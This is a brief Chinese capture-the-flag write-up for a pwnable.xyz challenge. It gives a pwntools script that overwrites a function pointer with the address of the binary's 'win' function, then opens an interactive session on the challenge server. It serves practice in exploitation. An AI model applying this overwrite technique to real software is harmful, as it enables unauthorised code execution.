函数指针覆盖，有一些细节，调试能发现，不难



```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

e = ELF('./challenge')
win_addr = e.symbols['win']
info('win address:' + hex(win_addr))

p = remote('svc.pwnable.xyz', 30032)
# p = process('./challenge')

p.sendlineafter(b'> ', b'1')
p.recvline()
p.sendline(b'100')
p.sendafter(b': ', b'a' * 100)
p.sendlineafter(b'> ', b'1')

p.sendlineafter(b'> ', b'1')
p.recvline()
p.sendline(b'16')
p.sendafter(b': ', b'a' * 7 + p64(win_addr))
p.sendlineafter(b'> ', b'0')

# gdb.attach(p)
p.sendlineafter(b'> ', b'2')
p.interactive()

```

